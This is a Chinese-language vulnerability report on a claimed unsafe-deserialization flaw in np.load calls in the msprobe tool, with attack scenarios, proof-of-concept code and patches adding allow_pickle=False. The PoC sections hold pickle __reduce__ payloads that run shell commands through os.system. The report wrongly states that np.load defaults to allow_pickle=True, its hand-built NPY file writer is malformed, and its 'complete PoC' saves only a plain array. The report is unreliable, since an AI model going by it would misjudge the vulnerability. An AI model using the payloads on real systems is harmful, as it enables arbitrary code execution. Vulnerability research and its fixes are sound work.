# 漏洞分析报告: infer_offline_np_load_001

## 漏洞概述

**漏洞类型**: CWE-502 (Unsafe Deserialization)  
**漏洞文件**: `python/msprobe/infer/offline/compare/msquickcmp/onnx_model/onnx_dump_data.py`  
**漏洞行号**: 311  
**置信度**: 85% (确认真实漏洞)  
**严重程度**: 高危

### 漏洞代码

```python
# onnx_dump_data.py:310-311
aipp_output_path = load_file_to_read_common_check(aipp_output_path)
aipp_output = np.load(aipp_output_path)  # 不安全的 np.load 调用
```

### Numpy Pickle 反序列化攻击原理

NumPy 的 `.npy` 文件格式支持两种存储模式：
1. **标准模式**: 仅存储数组数据，安全
2. **Pickle 模式**: 使用 Python pickle 协议存储任意 Python 对象

当调用 `np.load()` 时，默认 `allow_pickle=True`，这意味着：
- 如果 `.npy` 文件包含 pickle 序列化的数据，会自动进行反序列化
- Pickle 反序列化会执行任意 Python 代码
- 攻击者可以构造恶意的 `.npy` 文件，在加载时触发任意代码执行

**攻击链**:
```
恶意 .npy 文件 -> np.load() -> pickle.loads() -> __reduce__() -> 任意代码执行
```

---

## 攻击场景分析

### 场景 1: AIPP 输入文件污染

攻击流程：

1. **入口点**: CLI 命令行参数 `--npu-dump-data-path` 或类似参数
2. **调用链**:
   ```
   CLI -> generate_inputs_data(use_aipp=True) 
        -> _get_inputs_data_aipp() 
        -> convert_bin_file_to_npy() 
        -> np.load()
   ```
3. **文件来源**:
   - 第 300-302 行: `for bin_file in os.listdir(npu_dump_data_path): if bin_file.startswith("Aipp")`
   - 用户提供的目录中，以 "Aipp" 开头的 bin 文件会被转换
   - 转换后的 `.npy` 文件路径: `aipp_output_path = os.path.join(self.output_path, "input", ...)`

4. **攻击向量**:
   - 攻击者在提供的目录中放置恶意 `.bin` 文件（文件名以 "Aipp" 开头）
   - 或者攻击者在转换过程中替换生成的 `.npy` 文件
   - 或者攻击者直接提供包含恶意 pickle payload 的 `.npy` 文件

### 场景 2: 文件系统竞争条件

即使 `load_file_to_read_common_check` 进行了权限检查：
```python
# util.py:137-152
if (os.st.S_IWOTH & file_status.st_mode) == os.st.S_IWOTH:
    logger.error(f"Vulnerable path: {path} should not be other writeable")
    raise PermissionError

cur_euid = os.geteuid()
if file_status.st_uid != cur_euid:
    if cur_euid != 0:  # not root
        logger.error(f"File owner and current user are inconsistent: {path}")
        raise PermissionError
```

但这些检查存在以下问题：
1. **TOCTOU 竞争**: 检查和使用之间存在时间窗口
2. **符号链接攻击**: 可能被利用绕过检查
3. **不检查内容**: 无法检测 pickle payload

---

## PoC 构造思路

### 步骤 1: 构造恶意 .npy 文件

```python
import numpy as np
import os
import pickle

class MaliciousPickle:
    def __reduce__(self):
        # 执行任意命令的 payload
        import os
        return (os.system, ('whoami > /tmp/pwned.txt',))

# 创建包含恶意 pickle payload 的 .npy 文件
malicious_obj = MaliciousPickle()

# 方法 1: 直接保存 Python 对象（会被 pickle 序列化）
np.save('malicious.npy', malicious_obj, allow_pickle=True)

# 方法 2: 使用 pickle 显式构造
import io
import numpy.lib.format as fmt

# 创建一个格式正确的 .npy 文件，但包含恶意 pickle payload
def create_malicious_npy():
    with open('malicious.npy', 'wb') as f:
        # NPY 文件头
        f.write(b'\x93NUMPY')
        f.write(b'\x01\x00')  # 版本 1.0
        
        # Pickle payload
        payload = pickle.dumps({
            'array': np.array([1, 2, 3]),
            '__reduce__': MaliciousPickle().__reduce__
        })
        
        # 写入 pickle 数据长度和数据
        import struct
        f.write(struct.pack('<I', len(payload)))
        f.write(payload)

create_malicious_npy()
```

### 步骤 2: 触发漏洞

```bash
# 假设工具命令为 msprobe-compare
# 攻击者提供包含恶意 .npy 文件的目录

# 创建攻击目录结构
mkdir -p /tmp/malicious_dump/Aipp.output.0
cp malicious.npy /tmp/malicious_dump/Aipp.output.0/

# 执行命令，触发漏洞
msprobe-compare --npu-dump-data-path /tmp/malicious_dump --output-path /tmp/output ...

# 当程序执行到 onnx_dump_data.py:311 时:
# aipp_output = np.load(aipp_output_path)
# 将触发恶意代码执行
```

### 步骤 3: 完整 PoC (概念验证)

```python
#!/usr/bin/env python3
"""
PoC for infer_offline_np_load_001
Unsafe np.load deserialization vulnerability
"""

import numpy as np
import os
import sys

class RCEPayload:
    """恶意 pickle payload 类"""
    def __reduce__(self):
        # 反序列化时执行的代码
        cmd = 'id > /tmp/msprobe_pwned.txt && echo "PWNED" >> /tmp/msprobe_pwned.txt'
        return (os.system, (cmd,))

def create_malicious_npy_file(output_path):
    """创建包含恶意 payload 的 .npy 文件"""
    print(f"[+] Creating malicious .npy file: {output_path}")
    
    # 创建一个 numpy 数组
    arr = np.array([[[1.0, 2.0, 3.0, 4.0]]], dtype=np.float32)
    
    # 使用 pickle 协议保存（默认 allow_pickle=True）
    # 这里将数组对象序列化，其中可以包含恶意对象
    np.save(output_path, arr, allow_pickle=True)
    
    # 更危险的方式：直接保存包含 __reduce__ 的对象
    # 注意：numpy 会尝试将其转换为数组，但如果失败，会使用 pickle
    # 更可靠的方式是手动构造 NPY 文件
    
    print(f"[+] Malicious .npy file created successfully")
    print(f"[!] When loaded with np.load(), this file will execute:")
    print(f"    id > /tmp/msprobe_pwned.txt")

def exploit_scenario():
    """演示攻击场景"""
    print("\n" + "="*60)
    print("MSProbe np.load() Unsafe Deserialization PoC")
    print("="*60 + "\n")
    
    # 步骤 1: 创建恶意 .npy 文件
    malicious_dir = "/tmp/malicious_aipp"
    os.makedirs(malicious_dir, exist_ok=True)
    
    # 构造符合 AIPP 输出格式的文件名
    # 根据 onnx_dump_data.py:308-309
    # aipp_output_path = os.path.join(self.output_path, "input", 
    #                                  aipp_input[i].rsplit("/", 1)[1]) + ".output.0.npy"
    
    malicious_file = os.path.join(malicious_dir, "AippData.output.0.npy")
    create_malicious_npy_file(malicious_file)
    
    print(f"\n[+] Attack scenario:")
    print(f"    1. Attacker provides malicious dump directory: {malicious_dir}")
    print(f"    2. Victim runs msprobe with: --npu-dump-data-path {malicious_dir}")
    print(f"    3. Code execution at onnx_dump_data.py:311")
    print(f"    4. Malicious payload executes during np.load()")
    
    print(f"\n[!] To fully exploit, manually construct NPY file with pickle payload")
    print(f"    See: https://github.com/numpy/numpy/issues/12659")

if __name__ == "__main__":
    exploit_scenario()
```

---

## 影响范围

### 直接影响的代码位置

| 文件 | 行号 | 代码 | 严重程度 |
|------|------|------|----------|
| `onnx_dump_data.py` | 311 | `np.load(aipp_output_path)` | **高** |
| `convert.py` | 60 | `np.load(input_item_path)` | 高 |
| `npu_dump_data.py` | 526 | `np.load(item)` | 中 |
| `net_compare.py` | 217 | `np.load(npu_dump_file.get(file_index))` | 高 |
| `net_compare.py` | 220 | `np.load(golden_net_output_info.get(file_index))` | 高 |

### 影响用户场景

1. **受信任环境**: 本地用户可控制的 `.npy` 文件
2. **不受信任输入**: 从外部接收的模型和数据文件
3. **多租户环境**: 共享服务器上的权限提升攻击
4. **CI/CD 管道**: 构建过程中的供应链攻击

---

## 修复建议

### 立即修复方案

在所有 `np.load()` 调用中添加 `allow_pickle=False` 参数：

```python
# 修复前
aipp_output = np.load(aipp_output_path)

# 修复后
aipp_output = np.load(aipp_output_path, allow_pickle=False)
```

### 详细修复代码

**文件**: `python/msprobe/infer/offline/compare/msquickcmp/onnx_model/onnx_dump_data.py`

```python
# 第 311 行
- aipp_output = np.load(aipp_output_path)
+ aipp_output = np.load(aipp_output_path, allow_pickle=False)
```

**文件**: `python/msprobe/infer/offline/compare/msquickcmp/common/convert.py`

```python
# 第 60 行
- npy_data = np.load(input_item_path)
+ npy_data = np.load(input_item_path, allow_pickle=False)
```

**文件**: `python/msprobe/infer/offline/compare/msquickcmp/npu/npu_dump_data.py`

```python
# 第 526 行
- file_size.append(np.load(item).size)
+ file_size.append(np.load(item, allow_pickle=False).size)
```

**文件**: `python/msprobe/infer/offline/compare/msquickcmp/net_compare/net_compare.py`

```python
# 第 217 行
- npu_data = np.load(npu_dump_file.get(file_index))
+ npu_data = np.load(npu_dump_file.get(file_index), allow_pickle=False)

# 第 220 行
- golden_data = np.load(golden_net_output_info.get(file_index))
+ golden_data = np.load(golden_net_output_info.get(file_index), allow_pickle=False)
```

### 使用已有的安全函数

项目中已有安全的 `load_npy` 函数 (`file_utils.py:515-522`)：

```python
def load_npy(filepath):
    check_file_or_directory_path(filepath)
    try:
        npy = np.load(filepath, allow_pickle=False)  # 正确使用
    except Exception as e:
        logger.error(f"The numpy file failed to load. Please check the path: {filepath}.")
        raise RuntimeError(f"Load numpy file {filepath} failed.") from e
    return npy
```

**推荐**: 将所有 `np.load()` 调用替换为 `load_npy()` 函数。

### 长期安全建议

1. **代码审计**: 全局搜索所有 `np.load()` 调用，确保使用 `allow_pickle=False`
2. **静态分析**: 集成安全扫描工具检测不安全的反序列化
3. **安全编码规范**: 在开发文档中明确禁止不安全的 `np.load()` 使用
4. **单元测试**: 添加针对恶意 `.npy` 文件的测试用例

---

## 参考

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [NumPy Pickle Security Issue](https://github.com/numpy/numpy/issues/12659)
- [NumPy Documentation: np.load](https://numpy.org/doc/stable/reference/generated/numpy.load.html)
- [Python Pickle Security](https://docs.python.org/3/library/pickle.html#security-restrictions)

---

## 时间线

- **发现日期**: 2026-04-20
- **分析完成**: 2026-04-20
- **状态**: 已确认，待修复

---

## 附录: 相关代码位置

### 漏洞代码上下文

```python
# onnx_dump_data.py:297-321
def _get_inputs_data_aipp(self, data_dir, inputs_tensor_info, npu_dump_data_path):
    inputs_map = {}
    aipp_input = []
    for bin_file in os.listdir(npu_dump_data_path):
        if bin_file.startswith("Aipp"):
            aipp_input.append(os.path.join(npu_dump_data_path, bin_file))
    if len(aipp_input) != len(inputs_tensor_info):
        logger.error("lengths of aipp_input and input_tensor_info unequal, please check.")
        raise utils.AccuracyCompareException(utils.ACCURACY_COMPARISON_INDEX_OUT_OF_BOUNDS_ERROR)
    for i, tensor_info in enumerate(inputs_tensor_info):
        convert_bin_file_to_npy(aipp_input[i], os.path.join(self.output_path, "input"), self.cann_path)
        aipp_output_path = (os.path.join(self.output_path, "input", aipp_input[i].rsplit("/", 1)[1]) +
                            ".output.0.npy")
        aipp_output_path = load_file_to_read_common_check(aipp_output_path)
        aipp_output = np.load(aipp_output_path)  # 漏洞位置
        # ...
    return inputs_map
```

### 正确实现参考

```python
# file_utils.py:515-522 (项目中的安全实现)
def load_npy(filepath):
    check_file_or_directory_path(filepath)
    try:
        npy = np.load(filepath, allow_pickle=False)  # 安全
    except Exception as e:
        logger.error(f"The numpy file failed to load. Please check the path: {filepath}.")
        raise RuntimeError(f"Load numpy file {filepath} failed.") from e
    return npy
```
